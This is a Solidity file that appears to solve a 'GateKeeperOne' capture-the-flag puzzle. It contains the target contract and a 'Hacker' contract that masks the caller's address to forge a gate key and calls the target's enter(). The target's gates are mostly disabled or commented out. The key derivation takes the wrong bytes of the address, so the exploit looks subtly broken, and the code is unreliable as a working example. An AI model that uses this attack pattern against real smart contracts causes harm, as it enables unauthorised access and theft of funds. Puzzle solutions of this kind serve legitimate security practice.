// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

// import '@openzeppelin/contracts/math/SafeMath.sol';
// import "hardhat/console.sol";

contract GateKeeperOne {

  // using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    // console.log(gasleft());
    // require(gasleft() %(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateTwo returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Hacker {
    function attack(address victim, uint _gas) external {
        bytes20 addr = bytes20(msg.sender);
        bytes20 MASK = bytes20(0xfFFFfFfffFfFFfFFfffFffFFFffffFFF0000ffff);
        bytes20 res = addr & MASK;
        bytes8 _gateKey = bytes8(res);
        (bool success, ) = victim.call(abi.encodeWithSignature("enter(bytes8)", _gateKey));
        require(success, "tx failed");
    }
}